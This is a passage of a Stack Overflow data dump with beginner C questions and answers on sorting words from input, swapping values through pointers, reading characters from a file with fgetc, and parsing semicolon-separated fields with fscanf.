*aux;\n          aux = words[k];\n          words[k] = words[k+1];\n          words[k+1]= aux;\n          ok = 0;\n        }\n      }\n      --n;\n    }while(n&gt;0&amp;&amp;(ok==0));\n\n    for(j=0;j&lt;nrCuvinte;++j){\n      puts(words[j]);\n    }\n    for(j=0;j&lt;L;++j){\n      free(words[j]);\n    }\n    printf(\"If you want to exit type 'yes', else press enter.\\n\");\n    fgets(user_input,4,stdin);\n    if(strcmp(user_input, \"yes\") == 0)\n      break;\n  }\n}\n</code></pre>\n\n<p>I also wrote another version, this time wrapping your code inside a function and calling this function from the main function inside a <code>while(1)</code> loop:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;ctype.h&gt;\n\n#define L 500\n\nvoid sort_sentence(){\n  char *words[L];\n  char *word;\n  char sentence[100];\n  int i = 0, nrCuvinte = 0;\n  int j, k, ok, n, lung;\n\n  for(j=0;j&lt;L;++j)\n  {\n    words[j] = (char*)malloc(L*sizeof(char));\n  }\n  printf(\"Enter any sentence you want: \\n\");\n\n  fgets(sentence,99,stdin);\n  lung = strlen(sentence);\n\n  if(sentence[lung-1] == '\\n'){\n    sentence[lung-1] = '\\0';\n  }\n  printf(\"\\n\");\n\n  word = strtok(sentence, \" .,-;/?!\");\n  for(j=0;j&lt;(strlen(word)+1);j++){\n    word[j] = tolower((unsigned char) word[j]);\n  }\n  while(word != NULL){\n    for(j=0;j&lt;(strlen(word)+1);j++){\n      word[j] = tolower((unsigned char) word[j]);\n    }\n    strcpy(words[i],word);\n    word = strtok(NULL, \" .,-;/?!\");\n    ++i;\n    ++nrCuvinte;\n\n  }\n\n  n = nrCuvinte-1;\n  do{\n    ok =1;\n    for(k=0;k&lt;n;++k){\n      if(strcmp(words[k],words[k+1])&gt;0){\n        char *aux;\n        aux = words[k];\n        words[k] = words[k+1];\n        words[k+1]= aux;\n        ok = 0;\n      }\n    }\n    --n;\n  }while(n&gt;0&amp;&amp;(ok==0));\n\n  for(j=0;j&lt;nrCuvinte;++j){\n    puts(words[j]);\n  }\n  for(j=0;j&lt;L;++j){\n    free(words[j]);\n  }\n\n}\n\nint clean_stdin()\n{\n  while (getchar()!='\\n');\n  return 1;\n}\n\nint main(){\n\n  int user_input;\n  char c;\n\n  while(1){\n    sort_sentence();\n    do{\n      printf(\"If you want to exit type '2', if you want to continue type '1'.\\n\");\n    }while(((scanf(\"%d%c\", &amp;user_input, &amp;c) != 2 || c!='\\n') &amp;&amp; clean_stdin()) ||( user_input != 2 &amp;&amp; user_input != 1));\n    if(user_input == 2)\n      return 0;\n  }\n}\n</code></pre>\n\n<p>Edit: Now in the second code example the user will be prompted with a message telling her/him to enter 1 or 2 until he/she inputs 1 or 2, every other input results in getting prompted with the same message again. If 1 is entered the next sort_sentence() function call is executed, if 2 is read the program terminates. <strong>Credits</strong> go to <strong>MOHAMED</strong> for his elegant <a href=\"https://stackoverflow.com/questions/14099473/how-to-scanf-only-integer-and-repeat-reading-if-the-user-enter-non-numeric-chara\">solution</a> on the community wiki. I used his idea here.</p>\n"}], "owner": {"reputation": 1, "user_id": 10836775, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-T03DaR2XfSk/AAAAAAAAAAI/AAAAAAAAA8k/JdIYZ6-GCXk/photo.jpg?sz=128", "display_name": "Andrei - Alexandru Harpa", "link": "https://stackoverflow.com/users/10836775/andrei-alexandru-harpa"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 93, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1545877628, "creation_date": 1545863623, "question_id": 53937852, "link": "https://stackoverflow.com/questions/53937852/hi-i-tried-to-make-this-program-run-multiple-timesusing-for-and-do-while", "title": "Hi, I tried to make this program run multiple times(using for(;;) and do...while) but every time it stops at reading the string", "body": "<p>I created this program to read a string from the user and to sort it's word alphabetically, finally I tried to add a funtion for helping me running this program as much as the user wants, but never works. I used do...while, but every time the program stops before reading the string.</p>\n\n<pre><code>char *words[L];\nchar *word;\nchar sentence[100];\nint i = 0, nrCuvinte = 0;\n    int j, k, ok, n, lung;\n\n\nfor(j=0;j&lt;L;++j)\n{\n    words[j] = (char*)malloc(L*sizeof(char));\n}\nprintf(\"Enter any sentence you want: \\n\");\n\nfgets(sentence,99,stdin);\nlung = strlen(sentence);\n\nif(sentence[lung-1] == '\\n')\n{\n    sentence[lung-1] = '\\0';\n}\nprintf(\"\\n\");\n\nword = strtok(sentence, \" .,-;/?!\");\nfor(j=0;j&lt;(strlen(word)+1);j++)\n{\n    word[j] = tolower((unsigned char) word[j]);\n}\nwhile(word != NULL)\n{\n    for(j=0;j&lt;(strlen(word)+1);j++)\n    {\n        word[j] = tolower((unsigned char) word[j]);\n    }\n    strcpy(words[i],word);\n    word = strtok(NULL, \" .,-;/?!\");\n    ++i;\n    ++nrCuvinte;\n\n}\n\nn = nrCuvinte-1;\ndo{\n    ok =1;\n    for(k=0;k&lt;n;++k)\n    {\n        if(strcmp(words[k],words[k+1])&gt;0)\n        {\n            char *aux;\n            aux = words[k];\n            words[k] = words[k+1];\n            words[k+1]= aux;\n            ok = 0;\n        }\n    }\n    --n;\n}while(n&gt;0&amp;&amp;(ok==0));\n\nfor(j=0;j&lt;nrCuvinte;++j)\n{\n    puts(words[j]);\n}\nfor(j=0;j&lt;L;++j)\n{\n    free(words[j]);\n    words[j]=0;\n}\n</code></pre>\n"}, {"tags": ["c", "function", "pointers", "swap"], "answers": [{"tags": [], "owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "is_accepted": false, "score": 3, "last_activity_date": 1545863625, "creation_date": 1545863625, "answer_id": 53937853, "question_id": 53937811, "link": "https://stackoverflow.com/questions/53937811/confused-with-c-pointers/53937853#53937853", "title": "Confused with C pointers", "body": "<p>Here are all the modifications performed by <code>swapDoesNotWork</code>:</p>\n\n<pre><code> temp = ...\n px = ... \n py = ...\n</code></pre>\n\n<p>All of these are assignments to local variables. Local variables are destroyed when the function returns, so <code>swapDoesNotWork</code> has no lasting effects. It only changes variables that are about to stop existing anyway.</p>\n\n<p>On the other hand, <code>swap</code> contains these lines:</p>\n\n<pre><code> *px = ...\n *py = ...\n</code></pre>\n\n<p>These are assignments to locations pointed to by <code>px</code> and <code>py</code>, respectively. Even though <code>px</code> and <code>py</code> are local variables themselves, they can point to variables outside of the current function (in this case the function is called as <code>swap(&amp;x, &amp;y)</code>, so they point to the <code>x</code> and <code>y</code> variables in <code>main</code>).</p>\n"}, {"tags": [], "owner": {"reputation": 49, "user_id": 9852094, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-bu8XCTVNdck/AAAAAAAAAAI/AAAAAAAAADc/4m5GZFVcPfI/photo.jpg?sz=128", "display_name": "Jordan Sapida", "link": "https://stackoverflow.com/users/9852094/jordan-sapida"}, "is_accepted": false, "score": 1, "last_activity_date": 1545863942, "creation_date": 1545863942, "answer_id": 53937889, "question_id": 53937811, "link": "https://stackoverflow.com/questions/53937811/confused-with-c-pointers/53937889#53937889", "title": "Confused with C pointers", "body": "<p>With what you are doing you just cancelled the whole point of using pointers. </p>\n\n<p>What you are doing is basically the same as this:</p>\n\n<pre><code>temp = a;\na = b;\nb = temp;\n</code></pre>\n\n<p>which means that you are acting on a copy of the original variables. So what you do although it is changing the values of the pointers (if you try a printf inside the function the results should be correct) after the function is finished the results disappear. In order for that function to work you would have to pass as an argument a double pointer. Hope I helped</p>\n"}], "owner": {"reputation": 1, "user_id": 10836749, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-IWy7gTzM21A/AAAAAAAAAAI/AAAAAAAAAAA/AKxrwcaJtHRnbcPeKy5H0dL3dOHMNMtTeQ/mo/photo.jpg?sz=128", "display_name": "Lerner", "link": "https://stackoverflow.com/users/10836749/lerner"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 82, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1545864981, "creation_date": 1545863258, "last_edit_date": 1545864981, "question_id": 53937811, "link": "https://stackoverflow.com/questions/53937811/confused-with-c-pointers", "title": "Confused with C pointers", "body": "<pre><code> #include&lt;stdio.h&gt;\n\n// Function to swap two values but does not work\nvoid swapDoesNotWork (int *ptrX, int *ptrY);\n\n// Function to swap two values and works fine\nvoid swap (int *ptrX, int *ptrY);\n\nvoid swap (int *px, int *py) {\n int temp;\n temp = *px;\n *px = *py;\n *py = temp;\n}\n\nvoid swapDoesNotWork (int *px, int *py) {\n printf(\"\\n\\n\");\n int temp;\n temp = *px;\n px = py; \n py = &amp;temp;\n}\n\nint main() {\n int x = 5;\n int y = 10; \n swapDoesNotWork(&amp;x, &amp;y);\n printf(\"++++++++++++++++++\\n\");\n printf(\"pre x:%d\\n\", x); \n printf(\"pre y:%d\\n\", y); \n printf(\"\\n\");\n printf(\"After calling swapDoesNotWork(&amp;x, &amp;y)...\\n\");\n printf(\"post x:%d\\n\", x); \n printf(\"post y:%d\\n\", y); \n printf(\"++++++++++++++++++\\n\\n\");\n x = 5;\n y = 10; \n printf(\"= = = = = = = = =\\n\\n\");\n printf(\"pre x:%d\\n\", x); \n printf(\"pre y:%d\\n\", y); \n swap(&amp;x, &amp;y);\n\n printf(\"\\n\");\n printf(\"After calling swap(&amp;x, &amp;y)...\\n\");\n printf(\"post x:%d\\n\", x); \n printf(\"post y:%d\\n\", y); \n printf(\"= = = = = = = = =\\n\\n\");\n return 0;\n</code></pre>\n\n<p>The output of the above program when compiled and executed is:</p>\n\n<pre><code>infi@linux% ./swap_test.o \n\n\n++++++++++++++++++\npre x:5\npre y:10\n\nAfter calling swapDoesNotWork(&amp;x, &amp;y)...\npost x:5\npost y:10\n++++++++++++++++++\n\n= = = = = = = = =\n= = = = = = = = =    \npre x:5\npre y:10\n\nAfter calling swap(&amp;x, &amp;y)...\npost x:10\npost y:5\n</code></pre>\n\n<p>As can be seen, the <code>swapDoesNotWork</code> function does not seem to change the values as is the case with the <code>swap</code> function.</p>\n\n<p>I am new to C language, coming from mostly scripting background. Can someone help me why <code>swapDoesNotWork</code> functon is not changing the values?</p>\n"}, {"tags": ["c", "pointers", "fopen"], "comments": [{"owner": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "edited": false, "score": 0, "creation_date": 1545860812, "post_id": 53937490, "comment_id": 94715023, "body": "To access the file &quot;input.txt&quot; like this, you would have to <i>memory map</i> it. Otherwise, you will have to use <code>fgetc()</code> to read it char by char."}, {"owner": {"reputation": 37414, "user_id": 204883, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ba29060be0758fa6537ff3d768a91757?s=128&d=identicon&r=PG", "display_name": "Arkku", "link": "https://stackoverflow.com/users/204883/arkku"}, "edited": false, "score": 0, "creation_date": 1545861352, "post_id": 53937490, "comment_id": 94715199, "body": "As a related note, <code>sizeof(char)</code> is always <code>1</code> by definition, so multiplying by it is never necessary. And while it doesn&#39;t break anything here (because it&#39;s always <code>1</code>), pointer arithmetic does not require multiplying by the size of the type pointed to, e.g., <code>int *p = &amp;i; p += 2;</code> advances <code>p</code> by two <code>int</code>s, not two bytes."}, {"owner": {"reputation": 37414, "user_id": 204883, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ba29060be0758fa6537ff3d768a91757?s=128&d=identicon&r=PG", "display_name": "Arkku", "link": "https://stackoverflow.com/users/204883/arkku"}, "edited": false, "score": 0, "creation_date": 1545861602, "post_id": 53937490, "comment_id": 94715261, "body": "Also, you need to check that you don&#39;t write more than 99 characters to <code>currentString</code>. (If you write exactly 100, there won&#39;t be enough space for the terminating zero that C strings require, and if you write more than 100 you go out of bounds since you defined it as <code>char currentString[100]</code>.)"}, {"owner": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "reply_to_user": {"reputation": 37414, "user_id": 204883, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ba29060be0758fa6537ff3d768a91757?s=128&d=identicon&r=PG", "display_name": "Arkku", "link": "https://stackoverflow.com/users/204883/arkku"}, "edited": false, "score": 0, "creation_date": 1545861716, "post_id": 53937490, "comment_id": 94715293, "body": "@Arkku I wonder why you don&#39;t add these good points to your answer but post these as comments here"}, {"owner": {"reputation": 37414, "user_id": 204883, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ba29060be0758fa6537ff3d768a91757?s=128&d=identicon&r=PG", "display_name": "Arkku", "link": "https://stackoverflow.com/users/204883/arkku"}, "reply_to_user": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "edited": false, "score": 0, "creation_date": 1545863482, "post_id": 53937490, "comment_id": 94715695, "body": "@Ctx Hmm, I guess I feel that the &quot;actual question&quot; is about reading the file and these extra points, while important to know, are not directly related to that, but rather unrelated problems specific to the OPs code and thus not necessarily helpful to other people. OTOH I suppose this question as a whole might not be applicable to many others, and so could be viewed as &quot;help me fix this code&quot;, in which case they would be part of the answer\u2026"}], "answers": [{"tags": [], "owner": {"reputation": 37414, "user_id": 204883, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ba29060be0758fa6537ff3d768a91757?s=128&d=identicon&r=PG", "display_name": "Arkku", "link": "https://stackoverflow.com/users/204883/arkku"}, "is_accepted": false, "score": 3, "last_activity_date": 1545860976, "creation_date": 1545860976, "answer_id": 53937532, "question_id": 53937490, "link": "https://stackoverflow.com/questions/53937490/trying-to-get-the-strings-out-a-txt-file-in-c/53937532#53937532", "title": "Trying to get the strings out a txt file in c", "body": "<p><code>input</code> is a pointer to an opaque <code>FILE</code> type, not a pointer to the contents the file as you seem to assume. This means you cannot access the contents of the file through the pointer directly. Instead, you need to pass <code>input</code> to functions that read input from the file, such as <code>fgets</code>, <code>getc</code> and <code>fscanf</code>.</p>\n"}, {"comments": [{"owner": {"reputation": 107, "user_id": 10700430, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/eRTg7.png?s=128&g=1", "display_name": "Idan", "link": "https://stackoverflow.com/users/10700430/idan"}, "edited": false, "score": 0, "creation_date": 1545900508, "post_id": 53937534, "comment_id": 94723236, "body": "Thank you! That&#39;s a huge saver! 2 questions thogh: 1. why is currentChar a int? 2. how does fgetc knows the last character it returned and returns the next one each time?"}], "tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": false, "score": 1, "last_activity_date": 1545860988, "creation_date": 1545860988, "answer_id": 53937534, "question_id": 53937490, "link": "https://stackoverflow.com/questions/53937490/trying-to-get-the-strings-out-a-txt-file-in-c/53937534#53937534", "title": "Trying to get the strings out a txt file in c", "body": "<p>You're not reading from the file at all.  This:</p>\n\n<pre><code>currentChar = input;\n</code></pre>\n\n<p>Assigns the address of the <code>FILE</code> object pointed to by <code>input</code> to <code>currentChar</code>.  This is also a type mismatch because you're assigning a <code>FILE *</code> to a <code>char *</code>.  You also can't use  <code>strlen</code> on <code>input</code> because it is not a <code>char *</code>.  You should have gotten plenty of compiler warnings about these.</p>\n\n<p>To read characters from a file, use the <code>fgetc</code> function:</p>\n\n<pre><code>int currentChar = fgetc(input);\n\n//while the current character isn't the last character of the input file or a ';'\nwhile (currentChar != EOF &amp;&amp; currentChar != ';')\n    currentString[i] = currentChar;\n    printf(\"%c\", currentChar);\n    currentChar = fgetc(input);\n    i++;\n}\n</code></pre>\n"}], "owner": {"reputation": 107, "user_id": 10700430, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/eRTg7.png?s=128&g=1", "display_name": "Idan", "link": "https://stackoverflow.com/users/10700430/idan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 60, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1545860988, "creation_date": 1545860668, "question_id": 53937490, "link": "https://stackoverflow.com/questions/53937490/trying-to-get-the-strings-out-a-txt-file-in-c", "title": "Trying to get the strings out a txt file in c", "body": "<p>for some reason I get exeception after the line:</p>\n\n<pre><code>currentString[i] = *currentChar;\n</code></pre>\n\n<p>This code is ment to gather all of the the characters from a file, till it encounters the character ';', and put them in a string.\nDoes anyone knows what's the deal? thanks!\nThis is all of the code:</p>\n\n<pre><code>char currentString[100] = { 0 };\nchar *currentChar;\n\n//opening the input file\nFILE *input = fopen(\"input.txt\", \"r\");\n//if the file doesn't exist, the pointer will contain NULL\nif (input == NULL)\n{\n    exit(1);\n}\n\n//assigning the start of the input file adress to currentChar\ncurrentChar = input;\n\n//while the current character isn't the last character of the input file\nwhile (currentChar &lt; input + strlen(input) + 1)\n{\n    while (currentChar != ';')\n    {\n        currentString[i] = *currentChar;\n        printf(\"%c\", *currentChar);\n        currentChar = currentChar + 1*sizeof(char);\n        i++;\n    }\n}\n</code></pre>\n"}, {"tags": ["c", "text", "scanf"], "comments": [{"owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 0, "creation_date": 1545859457, "post_id": 53937287, "comment_id": 94714598, "body": "The general case: build a DFA. Skipping (optional) whitespace is only an extra state (or maybe two)"}, {"owner": {"reputation": 37414, "user_id": 204883, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ba29060be0758fa6537ff3d768a91757?s=128&d=identicon&r=PG", "display_name": "Arkku", "link": "https://stackoverflow.com/users/204883/arkku"}, "edited": false, "score": 2, "creation_date": 1545859711, "post_id": 53937287, "comment_id": 94714680, "body": "In particular, note that <code>%[^;]</code> is the complete specifier, and <i>not</i> followed by an <code>s</code>."}, {"owner": {"user_type": "does_not_exist", "display_name": "user10605163"}, "edited": false, "score": 0, "creation_date": 1545859750, "post_id": 53937287, "comment_id": 94714696, "body": "What is the problem with the fscanf specifier (with corrections mentioned in comments)? It shouldn&#39;t be significantly longer than the usual methods for whitespace-separated strings and if the code block was to be repeated multiple times, you would write a loop and/or function for it."}, {"owner": {"reputation": 3, "user_id": 6942482, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ff4ff741186abb77ed8fe30e81123842?s=128&d=identicon&r=PG&f=1", "display_name": "Jen", "link": "https://stackoverflow.com/users/6942482/jen"}, "reply_to_user": {"reputation": 1924, "user_id": 2669042, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c66a47707c3d1748c9977727ddfa4d50?s=128&d=identicon&r=PG", "display_name": "xing", "link": "https://stackoverflow.com/users/2669042/xing"}, "edited": false, "score": 0, "creation_date": 1545859922, "post_id": 53937287, "comment_id": 94714752, "body": "@xing Yes I tried it, but then I will need to do it 9 times. Like copy past the same code with the changes of the variables."}, {"owner": {"reputation": 37414, "user_id": 204883, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ba29060be0758fa6537ff3d768a91757?s=128&d=identicon&r=PG", "display_name": "Arkku", "link": "https://stackoverflow.com/users/204883/arkku"}, "edited": false, "score": 0, "creation_date": 1545859922, "post_id": 53937287, "comment_id": 94714753, "body": "OT: &quot;<i>Layer</i> and a painter&quot;?"}, {"owner": {"reputation": 4328, "user_id": 920069, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dd39f0db1f22e1314746491df063602a?s=128&d=identicon&r=PG", "display_name": "Retired Ninja", "link": "https://stackoverflow.com/users/920069/retired-ninja"}, "edited": false, "score": 3, "creation_date": 1545860076, "post_id": 53937287, "comment_id": 94714800, "body": "Read the whole line and use strtok to tokenize it."}, {"owner": {"reputation": 37414, "user_id": 204883, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ba29060be0758fa6537ff3d768a91757?s=128&d=identicon&r=PG", "display_name": "Arkku", "link": "https://stackoverflow.com/users/204883/arkku"}, "edited": false, "score": 1, "creation_date": 1545860164, "post_id": 53937287, "comment_id": 94714828, "body": "@Jen What do you mean copypaste? <code>fscanf(file, &quot; %9[^;];%99[^;];\u2026;%99[^\\n]&quot;, &amp;s.f1, &amp;s.f2, \u2026, &amp;s.f9)</code>. You can&#39;t get any shorter, really, since you need to mention each destination field and its format at least once. It&#39;s certainly shorter than <code>strtok</code> where you probably need two function calls per field. (But overall, nothing wrong with that solution either.)"}, {"owner": {"reputation": 3, "user_id": 6942482, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ff4ff741186abb77ed8fe30e81123842?s=128&d=identicon&r=PG&f=1", "display_name": "Jen", "link": "https://stackoverflow.com/users/6942482/jen"}, "reply_to_user": {"reputation": 37414, "user_id": 204883, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ba29060be0758fa6537ff3d768a91757?s=128&d=identicon&r=PG", "display_name": "Arkku", "link": "https://stackoverflow.com/users/204883/arkku"}, "edited": false, "score": 0, "creation_date": 1545861015, "post_id": 53937287, "comment_id": 94715103, "body": "@Arkku Oh yes, I tried what you wrote, but like this %9[^;] without the semicolon between, now it works. Why do you need to put the semicolon?"}, {"owner": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "edited": false, "score": 0, "creation_date": 1545861174, "post_id": 53937287, "comment_id": 94715141, "body": "I think he has more than one delimiter here"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1545862381, "post_id": 53937287, "comment_id": 94715464, "body": "&quot;Now I can&#39;t use fscanf because there is no spacing&quot; is an incorrect conclusion."}], "answers": [{"tags": [], "owner": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "is_accepted": false, "score": 1, "last_activity_date": 1545862512, "last_edit_date": 1545862512, "creation_date": 1545861105, "answer_id": 53937558, "question_id": 53937287, "link": "https://stackoverflow.com/questions/53937287/scanning-data-from-text-file-that-doesnt-have-spacing-between-each-item-of-dat/53937558#53937558", "title": "Scanning data from text file, that doesn&#39;t have spacing between each item of data", "body": "<p>Here you have simple tokenizer. As I see you have more than one delimiter here (<code>;</code> &amp; <code>,</code>)</p>\n\n<p><code>str</code> - string to be tokenized</p>\n\n<p><code>del</code> - string containing delimiters (in your case <code>\";,\"</code> or <code>\";\"</code> only)</p>\n\n<p><code>allowempty</code> - if true allows empty tokens if there are two or more consecutive delimiters </p>\n\n<p>return value is a NULL terminated table of pointers to the tokens.</p>\n\n<pre><code>char **mystrtok(const char *str, const char *del, int allowempty)\n{\n  char **result = NULL;\n  const char *end = str;\n  size_t size = 0;\n  int extrachar;\n\n  while(*end)\n  {\n    if((extrachar = !!strchr(del, *end)) || !*(end + 1))\n    {\n        /* add temp variable and malloc / realloc checks */\n        /* free allocated memory on error */\n        if(!(!allowempty &amp;&amp; !(end - str)))\n        {\n            extrachar = !extrachar * !*(end + 1);\n            result = realloc(result, (++size + 1) * sizeof(*result));\n            result[size] = NULL;\n            result[size -1] = malloc(end - str + 1 + extrachar);\n            strncpy(result[size -1], str, end - str + extrachar);\n            result[size -1][end - str + extrachar] = 0;\n        }\n        str = end + 1;\n    }\n    end++;\n  }\n  return result;\n}\n</code></pre>\n\n<p>To free the the memory allocated by the tokenizer:</p>\n\n<pre><code>void myfree(char **ptr)\n{\n    char **savedptr = ptr;\n    while(*ptr)\n    {\n        free(*ptr++);\n    }\n    free(savedptr);\n}\n</code></pre>\n\n<p>Function is simple but your can use any separators and any number of separators.</p>\n"}, {"comments": [{"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1545862323, "post_id": 53937692, "comment_id": 94715448, "body": "Likely <code>s.field1</code> is needed than <code>&amp;s.field1</code> as supposedly <code>.field1</code> is an array.  For clarity, suggest adding a sample <code>struct</code> for <code>s</code>."}, {"owner": {"reputation": 37414, "user_id": 204883, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ba29060be0758fa6537ff3d768a91757?s=128&d=identicon&r=PG", "display_name": "Arkku", "link": "https://stackoverflow.com/users/204883/arkku"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1545863059, "post_id": 53937692, "comment_id": 94715612, "body": "@chux Thanks, my bad about the extra <code>&amp;</code>. As for the sample <code>struct</code>, I don&#39;t think it&#39;s particularly enlightening for me to make up lengths and types without knowing the OPs intent, so omitting it unless needed by OP."}, {"owner": {"reputation": 3, "user_id": 6942482, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ff4ff741186abb77ed8fe30e81123842?s=128&d=identicon&r=PG&f=1", "display_name": "Jen", "link": "https://stackoverflow.com/users/6942482/jen"}, "edited": false, "score": 0, "creation_date": 1545990568, "post_id": 53937692, "comment_id": 94750906, "body": "@Arkku Hey, I tried it, works well till the %d, after that, I get an error. I updated the post... Thanks"}, {"owner": {"reputation": 37414, "user_id": 204883, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ba29060be0758fa6537ff3d768a91757?s=128&d=identicon&r=PG", "display_name": "Arkku", "link": "https://stackoverflow.com/users/204883/arkku"}, "reply_to_user": {"reputation": 3, "user_id": 6942482, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ff4ff741186abb77ed8fe30e81123842?s=128&d=identicon&r=PG&f=1", "display_name": "Jen", "link": "https://stackoverflow.com/users/6942482/jen"}, "edited": false, "score": 0, "creation_date": 1545990752, "post_id": 53937692, "comment_id": 94750976, "body": "@Jen You need to pass a pointer, so the age field needs &amp; to take its address. And you don\u2019t need to allocate it separately, it is already included in the struct."}, {"owner": {"reputation": 3, "user_id": 6942482, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ff4ff741186abb77ed8fe30e81123842?s=128&d=identicon&r=PG&f=1", "display_name": "Jen", "link": "https://stackoverflow.com/users/6942482/jen"}, "edited": false, "score": 0, "creation_date": 1545991172, "post_id": 53937692, "comment_id": 94751135, "body": "@Arkku Ya I have the &amp;, &amp;temp.age, still get the error. I deleted the allocation for the int."}, {"owner": {"reputation": 37414, "user_id": 204883, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ba29060be0758fa6537ff3d768a91757?s=128&d=identicon&r=PG", "display_name": "Arkku", "link": "https://stackoverflow.com/users/204883/arkku"}, "reply_to_user": {"reputation": 3, "user_id": 6942482, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ff4ff741186abb77ed8fe30e81123842?s=128&d=identicon&r=PG&f=1", "display_name": "Jen", "link": "https://stackoverflow.com/users/6942482/jen"}, "edited": false, "score": 0, "creation_date": 1545995140, "post_id": 53937692, "comment_id": 94752666, "body": "@Jen Please enable (and read) the warnings on your compiler, it should warn about incorrect type. In order to store the results, <code>fscanf</code> needs pointers to the type being converted, i.e., for <code>%d</code> you need <code>int *</code> and for <code>%c</code> you need <code>char *</code>. So, since you have <code>char gender</code>, you need to pass <code>&amp;gender</code> to <code>fscanf</code>, since the <code>&amp;</code> &quot;adds a <code>*</code> to the type&quot; by taking the address. (The strings are already <code>char *</code> in your struct, so they don&#39;t need the additional <code>&amp;</code>.)"}], "tags": [], "owner": {"reputation": 37414, "user_id": 204883, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ba29060be0758fa6537ff3d768a91757?s=128&d=identicon&r=PG", "display_name": "Arkku", "link": "https://stackoverflow.com/users/204883/arkku"}, "is_accepted": true, "score": 2, "last_activity_date": 1545862976, "last_edit_date": 1545862976, "creation_date": 1545862156, "answer_id": 53937692, "question_id": 53937287, "link": "https://stackoverflow.com/questions/53937287/scanning-data-from-text-file-that-doesnt-have-spacing-between-each-item-of-dat/53937692#53937692", "title": "Scanning data from text file, that doesn&#39;t have spacing between each item of data", "body": "<p>As discussed in the comments, <code>fscanf</code> is probably the shortest option (although <code>fgets</code> followed by <code>strtok</code>, and manual parsing are viable options).</p>\n\n<p>You need to use the <code>%[^;]</code> specifier for the string fields (meaning: a string of characters <em>other than</em> <code>;</code>), with the fields separated by <code>;</code> to consume the actual semicolons (which we specifically requested not to be consumed as part of the string field). The last field should be <code>%[^\\n]</code> to consume up to the newline, since the input doesn't have a terminating semicolon.</p>\n\n<p>You should also 